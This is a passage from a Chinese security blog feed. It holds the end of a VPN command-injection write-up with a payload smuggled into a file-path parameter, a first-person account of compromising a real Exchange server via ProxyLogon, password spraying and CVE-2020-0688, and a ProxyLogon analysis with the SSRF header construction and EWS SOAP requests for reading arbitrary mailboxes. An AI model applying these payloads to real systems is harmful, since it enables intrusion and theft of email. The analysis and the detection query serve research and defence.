&#125;]<br></code></pre></td></tr></table></figure><p>这三个参数，对应着：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">类名：SSLVPN_Resource<br>方法：deleteImage<br>参数：&#123;<br>     <span class="hljs-string">&quot;data&quot;</span>:[<span class="hljs-string">&quot;/var/www/html/b.txt;echo&#x27;fa3a6469&#x27;&gt;/var/www/html/fa3a6.txt&quot;</span>]<br>    &#125; <br>    <span class="hljs-comment"># call_user_func_array使用数组传递参数</span><br>    <br></code></pre></td></tr></table></figure><p>那就直接去代码中寻找就行</p><p><img src="/img/article2/image-20210415024532281.png" alt="image-20210415024532281"></p><p>一目了然，参数传递的是一个对象，取 <code>data</code> 的值（数组）进行遍历后，如果遍历的值不是default.png，则将该值拼接进命令执行删除，其中未作任何过滤，直接通过 <code>;</code> 即可执行任意命令。</p><h3 id="其他RCE点"><a href="#其他RCE点" class="headerlink" title="其他RCE点"></a>其他RCE点</h3><p>其实可调用的model中还有很多的rce点，比如以下这个点</p><p><img src="/img/article2/image-20210415025011554.png" alt="image-20210415025011554"></p><p>利用方式更简洁明了</p><p><img src="/img/article2/image-20210415025038253.png" alt="image-20210415025038253"></p><p>而且此处是回显的。</p><p>又比如</p><p><img src="/img/article2/image-20210415025132254.png" alt="image-20210415025132254"></p><p>这里，对于linux系统来说建立文件夹的名称是可以包含特殊字符的</p><p><img src="/img/article2/image-20210415025243740.png" alt="image-20210415025243740"></p><p>这样的话其实对他们执行命令时需要通过转义符进行转义，比如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rm -rf 1\;2<br></code></pre></td></tr></table></figure><p>但是这个代码里明显没有，这个exec_cmd是执行环境变量 <code>CMD</code> 的值，所以这里又是一处命令注入点</p><p><img src="/img/article2/image-20210415025521207.png" alt="image-20210415025521207"></p><p>应该还有很多地方把，不一个个挖了。。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Exp</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个exchange小实战</title>
    <link href="/2021/04/01/%E4%B8%80%E4%B8%AAexch%E5%B0%8F%E5%AE%9E%E6%88%98/"/>
    <url>/2021/04/01/%E4%B8%80%E4%B8%AAexch%E5%B0%8F%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<h1 id="一个exchange小实战"><a href="#一个exchange小实战" class="headerlink" title="一个exchange小实战"></a>一个exchange小实战</h1><p>这个目标打的有点意思，记录一下</p><h2 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h2><p>信息收集以后发现目标开了exchange，一看版本，还挺低的。还觉得运气不错，指不定proxyLogon一发入魂。</p><p><img src="/img/article2/image-20210401191331298.png" alt="image-20210401191331298"></p><h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><p>先测了一手poc，dnslog收到了请求，漏洞存在，内心狂喜。</p><p><img src="/img/article2/image-20210401192029585.png" alt="image-20210401192029585"></p><p><img src="/img/article2/image-20210401192056920.png" alt="image-20210401192056920"></p><p>但是后来才发现事情没有那么简单，访问/ecp/proxyLogon.ecp这个接口直接404…</p><p>当时在现场并不知道为什么会404，后来才知道是cas与mbx的分离部署。</p><h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><p>当下有点头疼，只能先换个思路，尝试从ews去读取邮件信息，看看能不能从邮件里发现些什么</p><p>然后更诡异的事情发生了，读数量的地方没什么问题，可读取邮件itemid的时候，死活不能识别邮箱地址，明明用<code>&lt;t:EmailAddress&gt;&lt;/t:EmailAddress&gt;</code> 标签制定了，怎么试都不行，无奈放弃了这个想法，这个问题至今也没搞懂是为什么。</p><h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><p>邮件也读不到，很难受。于是再换一个思路，去读取GAL（全局地址列表），这次倒是成功的，通过autodiscover接口读到oaburl，然后再通过lzx地址下载lzx，最后通过工具解密，具体步骤见前面的文章。</p><p><img src="/img/article2/image-20210401192949824.png" alt="image-20210401192949824"></p><p> 导出来三千个邮箱账户，就想着说不定爆破进去一个呢，0688直接起飞。于是用ebruster喷了两天，因为担心用户锁定，一天只敢喷三次，从未中奖的我结果当然也没成功。</p><h2 id="柳暗花明"><a href="#柳暗花明" class="headerlink" title="柳暗花明"></a>柳暗花明</h2><p>就在我已经快要放弃这个点的时候，因为实在是不甘心就又看了看ews的返回包，突然发现了华点</p><p><img src="/img/article2/image-20210401193347266.png" alt="image-20210401193347266"></p><p>这里显示了一个和之前两台长得完全不一样的机器名，于是我就顺手尝试了一下他</p><p><img src="/img/article2/image-20210401193423797.png" alt="image-20210401193423797"></p><p>！！！！他居然没有删掉ecp的接口！！！，内心狂喜，感觉上天眷顾了我这个努力的打工人</p><p>后来才知道，这是后端处理的端点，mbx后端邮箱服务。</p><h2 id="一波三折"><a href="#一波三折" class="headerlink" title="一波三折"></a>一波三折</h2><p>但是这台机器在外网是访问不到的，直接写webshell肯定不行，于是我想着通过unc路径，把webshell写到外面能访问的机器上。</p><p><code>\\\x.x.local\c$\Program File\exchange\xxx\v15\http\owa\auth\1.aspx</code></p><p>然而事实又和我开起玩笑，对方把<code>DDI</code> 类给禁掉了。</p><p><img src="/img/article2/image-20210401193903734.png" alt="image-20210401193903734"></p><p>当场人就傻了，这啥机器啊，也太灵性了。</p><h2 id="有志者，事竟成"><a href="#有志者，事竟成" class="headerlink" title="有志者，事竟成"></a>有志者，事竟成</h2><p>就在我又一次陷入自闭的时候，我突然想到了他之前的版本号。15.08，这个版本应该连cve-2020-0688也没修掉。而0688的利用条件是有一个普通用户的凭证。虽然我没有用户的凭证，但是我有proxyLogon呀！！！！</p><p>通过proxyLogon我可以直接拿到asp.net_session。</p><p>说干就干，首先通过/ecp/proxyLogon.ecp接口通过ecp的认证，获得.net的session。</p><p><img src="/img/article2/image-20210401194405162.png" alt="image-20210401194405162"></p><p>然后通过这个session直接生成0688的payload（前提是<code>generator</code> 的值是默认值），然后通过ssrf直接梭哈。</p><p><img src="/img/article2/image-20210401194714081.png" alt="image-20210401194714081"></p><p><img src="/img/article2/image-20210401195145084.png" alt="image-20210401195145084"></p><p>注意：</p><ul><li>仍需要添加的 <code>msExchLogonMailbox</code> 的头</li><li>需要放在请求头的最下方，不知道为啥</li><li>请求需要用get哦</li></ul><p>好家伙，收到请求的时候眼泪都要流出来了。</p><p>后面的操作就很常规了，没啥好说的。</p><p>这个故事就是 告诉大家不要轻言放弃。</p>]]></content>
    
    
    <categories>
      
      <category>AD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AD</tag>
      
      <tag>Exchange</tag>
      
      <tag>Real</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021–26855 &amp; CVE-2021–27065（ProxyLogon）分析</title>
    <link href="/2021/03/20/exchange_ssrf/"/>
    <url>/2021/03/20/exchange_ssrf/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021–26855-amp-CVE-2021–27065（ProxyLogon）分析"><a href="#CVE-2021–26855-amp-CVE-2021–27065（ProxyLogon）分析" class="headerlink" title="CVE-2021–26855 &amp; CVE-2021–27065（ProxyLogon）分析"></a>CVE-2021–26855 &amp; CVE-2021–27065（ProxyLogon）分析</h1><p>3月初公布的4个Exchange 0day就像重磅炸弹一样，在安全圈子内引起了很大的动荡。毕竟作为内网安全领域的 ” 王牌嘉宾 ” ，Exchange永远都是最受关注的系统。这次一共公布了4个0day：</p><ul><li>CVE-2021–26855：SSRF</li><li>CVE-2021-27065：任意文件写入</li><li>CVE-2021-26857：认证后的反序列化</li><li>CVE-2021-26858：任意文件写入</li></ul><p>其中有些利用的利用链非常精彩，因此这篇文章也是来讨论一下其中一些攻击细节</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>针对ProxyLogon，我个人的理解是，exchange提供给用户的请求接口，是通过https，也就是服务的443端口，而后端真正处理的这些接口，是在服务的444端口。因此本次的漏洞就是发生在https与后端针对机器本身的一个衔接的过程之中。</p><h2 id="CVE-2021-26855"><a href="#CVE-2021-26855" class="headerlink" title="CVE-2021-26855"></a>CVE-2021-26855</h2><p>windows 针对该漏洞的日志的检测</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Csv</span> <span class="hljs-literal">-Path</span> (<span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;<span class="hljs-variable">$env:PROGRAMFILES</span>\Microsoft\Exchange Server\V15\Logging\HttpProxy&quot;</span> <span class="hljs-literal">-Filter</span> <span class="hljs-string">&#x27;*.log&#x27;</span>).FullName `<br>| <span class="hljs-built_in">Where-Object</span> &#123;  <span class="hljs-variable">$_</span>.AuthenticatedUser <span class="hljs-operator">-eq</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$_</span>.AnchorMailbox <span class="hljs-operator">-like</span> <span class="hljs-string">&#x27;ServerInfo~*/*&#x27;</span> &#125; | <span class="hljs-built_in">select</span> DateTime, AnchorMailbox<br></code></pre></td></tr></table></figure><p>对比修补补丁，发现命名空间 <code>Microsoft.Exchange.FrontEndHttpProxy</code> 中存在修改。</p><p><img src="https://miro.medium.com/max/921/1*SCxFVjLIAw1AyVQQfa45IQ.png" alt="img"></p><p>具体修改了 <strong><em>BEResourceRequestHandler</em></strong> 类</p><p><img src="https://miro.medium.com/max/1862/1*XpvJr0Dv7rwfUv-PMVDjOg.png" alt="img"></p><p>跟踪这个类，找到在 <code>ProxyModule</code> 类中的 <code>SelectHandlerForUnauthenticatedRequest</code> 方法调用了它</p><p><img src="https://www.praetorian.com/wp-content/uploads/2021/03/minified-code-image-1-1024x576.png" alt="img"></p><p>继续跟发现在 <strong><em>BEResourceRequestHandler.CanHandle()</em></strong> 方法中调用</p><p><img src="https://miro.medium.com/max/1833/1*VGtkJ9H8GdCx7bduvh1WhA.png" alt="img"></p><p>这里做了两个判断：</p><p>使用 <strong><em>GetBEResouceCookie</em></strong> 方法检查cookie存在，返回 <strong><em>X-BEResource</em></strong> cookie值</p><p><img src="https://miro.medium.com/max/707/1*q-f1BCcYRjvTYR6IBwWLoA.png" alt="img"></p><p><strong><em>IsResourceRequests</em></strong> 方法将检查请求的是不是静态资源。如果是的，会将cookie值传递到 <code>ServerAnchorMailbox</code> 类中，该类用以定位该邮箱地址。该cookie值通过**<em>BackEndServer.FromString**</em> 方法处理，作为后端服务器被请求。</p><p><img src="https://miro.medium.com/max/1313/1*ab7nr8hou12XdlZvpdt37w.png" alt="img"></p><p><img src="https://miro.medium.com/max/962/1*NFINrMQY6aw39pVL24Jg4g.png" alt="img"></p><p>可以看到使用 <code>~</code> 分割cookie值，将 <code>array[1]</code> 转换为int并存为 <code>version</code> ,并将 <code>array[0]</code> 作为请求服务器</p><p>因此可以构造</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">X-BEResource = EXCHANGE2016〜1942062522<br></code></pre></td></tr></table></figure><p>发现返回的 <strong><em>BackEndServer</em></strong> 对象在 <strong><em>ProxyRequestsHandler</em></strong> 类中的  <strong><em>GetTargetBackEndServerUrl</em></strong> 方法中调用。可以看到通过 <strong><em>UriBuilder</em></strong> 类来拼接url，这是 .net 的原生类。</p><p><img src="https://www.praetorian.com/wp-content/uploads/2021/03/minified-code-image-2.png" alt="img"></p><p><img src="https://www.praetorian.com/wp-content/uploads/2021/03/ToString-method-image-1-1024x543.png" alt="img"></p><p>可以看到 <strong><em>UriBuilder.ToString</em></strong> 的构造方式，将解析用户信息、host、端口、路径、请求参数和路由。</p><p><strong><em>UriBuilder</em></strong> 解析的例子如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># http://222:333@a.b.c/x/y/z.php?m=102909#111</span><br>scheme：http<br>userInfo：222:333   <br>host：a.b.c<br>path：/x/y/z.php<br>queryParams：[m=102909]<br>fragment：111   路由<br>charset：GBK<br></code></pre></td></tr></table></figure><p>因此当我们像构造路径请求后端的节点时（例如 <code>/autodiscover/autodiscover.xml</code>）uribuilder不会将 <strong><em>~1942062522</em></strong> 解析为路径，所以为了使得请求带有分割的参数，我们最终可以通过添加请求参数或者路由来拼接 <strong><em>~1942062522</em></strong>。最终可构造如下。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">X-BEResource=EXCHANGE2016<span class="hljs-regexp">/owa/</span>auth/logon.aspx?a=~<span class="hljs-number">1942062522</span>;<br>或<br>X-BEResource=EXCHANGE2016<span class="hljs-regexp">/owa/</span>auth/logon.aspx<span class="hljs-comment">#~1942062522;</span><br></code></pre></td></tr></table></figure><p>当然为了能够进入到 BackendServer 的实现，我们需要确保开头的两个判断成立，换句话说需要保证请求的是静态资源。而由于这部分只是对转发协议的实现，并不涉及真实文件是否存在的判断。所以并不需要真实的路径存在。因此，仅请求 <code>/ecp/x.js</code> 就可以满足条件。</p><p>至此，CVE-2021-26855就诞生了。:-)</p><h3 id="绕过验证获取邮件"><a href="#绕过验证获取邮件" class="headerlink" title="绕过验证获取邮件"></a>绕过验证获取邮件</h3><h4 id="通过kerberos绕过认证"><a href="#通过kerberos绕过认证" class="headerlink" title="通过kerberos绕过认证"></a>通过kerberos绕过认证</h4><p><code>/EWS/Exchange.asmx</code> 是exchange提供的web service接口，允许通过远程soap请求，通过xml数据操作exchange服务，包括对邮箱的操作。</p><p>我们尝试通过SSRF漏洞去请求ews的接口，我先尝试更改了机器名</p><p><img src="/img/article2/image-20210319171945640.png" alt="image-20210319171945640"></p><p>通过报错发现原来后端使用了 negotiate 认证，即是通过票据认证的。因此我们可以通过请求域内FQDN（机器名+域名）来使用本地票据通过认证。原理就类似白银票据，利用本地的机器hash来伪造任意用户。</p><p><img src="/img/article2/image-20210319172331529.png" alt="image-20210319172331529"></p><p>果然当我们使用正确的机器名，我们就绕过了登录验证。</p><h4 id="操作邮件"><a href="#操作邮件" class="headerlink" title="操作邮件"></a>操作邮件</h4><p>通过发送xml数据，利用ews接口可以直接操作邮箱服务，三好学生师傅已经有文章讲述如何通过xml操作ews接口</p><p>链接 ：<a href="https://3gstudent.github.io/3gstudent.github.io/Exchange-Web-Service(EWS)%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%972-SOAP-XML-message/">https://3gstudent.github.io/3gstudent.github.io/Exchange-Web-Service(EWS)%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%972-SOAP-XML-message/</a></p><p>当然也可以直接通过微软的官方文档来学习</p><p>链接：<a href="https://docs.microsoft.com/zh-cn/exchange/client-developer/web-service-reference/ews-operations-in-exchange">https://docs.microsoft.com/zh-cn/exchange/client-developer/web-service-reference/ews-operations-in-exchange</a></p><p>三好学生师傅的代码还需要少许修改，通过 <code>&lt;t:EmailAddress&gt;admin@x.local&lt;/t:EmailAddress&gt;</code> 来指定邮箱名</p><p>以下摘自三好师傅的博客，并加入少许修改</p><ul><li><p>查看数量</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> </span><br><span class="hljs-tag">               <span class="hljs-attr">xmlns:m</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/exchange/services/2006/messages&quot;</span> </span><br><span class="hljs-tag">               <span class="hljs-attr">xmlns:t</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/exchange/services/2006/types&quot;</span> </span><br><span class="hljs-tag">               <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><br>    &lt;m:GetFolder&gt;<br>      &lt;m:FolderShape&gt;<br>        &lt;t:BaseShape&gt;Default&lt;/t:BaseShape&gt;<br>      &lt;/m:FolderShape&gt;<br>      &lt;m:FolderIds&gt;<br>        &lt;t:DistinguishedFolderId Id=&quot;inbox&quot;/&gt;<br>          &lt;t:Mailbox&gt;<br>            &lt;t:EmailAddress&gt;admin@x.local&lt;/t:EmailAddress&gt;<br>          &lt;/t:Mailbox&gt;<br>        &lt;/t:DistinguishedFolderId&gt;<br>      &lt;/m:FolderIds&gt;<br>    &lt;/m:GetFolder&gt;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>获得收件箱邮件信息</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns:m</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/exchange/services/2006/messages&quot;</span> <span class="hljs-attr">xmlns:t</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/exchange/services/2006/types&quot;</span> <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">soap:Header</span>&gt;</span><br>    &lt;t:RequestServerVersion Version=&quot;Exchange2013_SP1&quot; /&gt;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Header</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><br>    &lt;m:FindItem Traversal=&quot;Shallow&quot;&gt;<br>      &lt;m:ItemShape&gt;<br>        &lt;t:BaseShape&gt;AllProperties&lt;/t:BaseShape&gt;<br>        &lt;t:BodyType&gt;Text&lt;/t:BodyType&gt;<br>      &lt;/m:ItemShape&gt;<br>      &lt;m:IndexedPageItemView MaxEntriesReturned=&quot;2147483647&quot; Offset=&quot;0&quot; BasePoint=&quot;Beginning&quot; /&gt;<br>      &lt;m:ParentFolderIds&gt;<br>        &lt;t:DistinguishedFolderId Id=&quot;inbox&quot; /&gt;<br>          &lt;t:Mailbox&gt;<br>            &lt;t:EmailAddress&gt;admin@x.local&lt;/t:EmailAddress&gt;<br>          &lt;/t:Mailbox&gt;<br>      &lt;/m:ParentFolderIds&gt;<br>    &lt;/m:FindItem&gt;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure><p>通过返回内容可以获得收件箱所有邮件的标题、收发关系、是否带有附件等，但无法显示正文内容和附件名称</p><p>通过返回内容能够获得每个邮件对应的ItemId和ChangeKey，进而获得邮件内容、附件的名称和Id</p></li><li><p>获得邮件的内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns:m</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/exchange/services/2006/messages&quot;</span> <span class="hljs-attr">xmlns:t</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/exchange/services/2006/types&quot;</span> <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">soap:Header</span>&gt;</span><br>    &lt;t:RequestServerVersion Version=&quot;Exchange2013_SP1&quot; /&gt;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Header</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><br>    &lt;m:GetItem&gt;<br>      &lt;m:ItemShape&gt;<br>        &lt;t:BaseShape&gt;AllProperties&lt;/t:BaseShape&gt;<br>        &lt;t:BodyType&gt;Text&lt;/t:BodyType&gt;<br>      &lt;/m:ItemShape&gt;<br>      &lt;m:ItemIds&gt;<br>        &lt;t:ItemId Id=&quot;&#123;id&#125;&quot; ChangeKey=&quot;&#123;key&#125;&quot; /&gt;<br>          &lt;t:Mailbox&gt;<br>            &lt;t:EmailAddress&gt;admin@x.local&lt;/t:EmailAddress&gt;<br>          &lt;/t:Mailbox&gt;<br>      &lt;/m:ItemIds&gt;<br>    &lt;/m:GetItem&gt;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>获得邮件的附件名字</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns:m</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/exchange/services/2006/messages&quot;</span> <span class="hljs-attr">xmlns:t</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/exchange/services/2006/types&quot;</span> <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">soap:Header</span>&gt;</span><br>    &lt;t:RequestServerVersion Version=&quot;Exchange2013_SP1&quot; /&gt;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Header</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><br>    &lt;m:GetItem&gt;<br>      &lt;m:ItemShape&gt;<br>        &lt;t:BaseShape&gt;IdOnly&lt;/t:BaseShape&gt;<br>        &lt;t:AdditionalProperties&gt;<br>          &lt;t:FieldURI FieldURI=&quot;item:Attachments&quot; /&gt;<br>        &lt;/t:AdditionalProperties&gt;<br>      &lt;/m:ItemShape&gt;<br>      &lt;m:ItemIds&gt;<br>        &lt;t:ItemId Id=&quot;&#123;id&#125;&quot; /&gt;<br>          &lt;t:Mailbox&gt;<br>            &lt;t:EmailAddress&gt;admin@x.local&lt;/t:EmailAddress&gt;<br>          &lt;/t:Mailbox&gt;<br>      &lt;/m:ItemIds&gt;<br>    &lt;/m:GetItem&gt;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure><p>返回附件的id、类型</p></li><li><p>获取附件内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns:m</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/exchange/services/2006/messages&quot;</span> <span class="hljs-attr">xmlns:t</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/exchange/services/2006/types&quot;</span> <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">soap:Header</span>&gt;</span><br>    &lt;t:RequestServerVersion Version=&quot;Exchange2013_SP1&quot; /&gt;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Header</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><br>    &lt;m:GetAttachment&gt;<br>      &lt;m:AttachmentIds&gt;<br>        &lt;t:AttachmentId Id=&quot;&#123;id&#125;&quot; /&gt;<br>          &lt;t:Mailbox&gt;<br>            &lt;t:EmailAddress&gt;admin@x.local&lt;/t:EmailAddress&gt;<br>          &lt;/t:Mailbox&gt;<br>      &lt;/m:AttachmentIds&gt;<br>    &lt;/m:GetAttachment&gt;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure><p>返回的数据中，<code>&lt;t:content&gt;</code> 标签内的数据为base64编码后的内容，解码后可获得附件的内容。这里要注意附件的类型，如果为text，表示文本类型，否则在保存附件时需要以二进制格式写入。</p></li></ul><h4 id="获取GAL"><a href="#获取GAL" class="headerlink" title="获取GAL"></a>获取GAL</h4><p>Exchange GlobalAddressList（全局地址列表）包含域内所有的邮件用户地址，获取他将对我们的渗透测试大有帮助，我们同样可以通过SSRF+xml来尝试导出GAL</p><p>之前的exchange利用中提到过，可以利用OAB来导出GAL，这是通过 <code>/autodiscover/autodiscover.xml</code> 接口来查询OAB地址的信息</p><ul><li><p>通过发送以下xml数据获取OAB地址</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Autodiscover</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Request</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">EMailAddress</span>&gt;</span>administrator@x.local<span class="hljs-tag">&lt;/<span class="hljs-name">EMailAddress</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">AcceptableResponseSchema</span>&gt;</span>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a<span class="hljs-tag">&lt;/<span 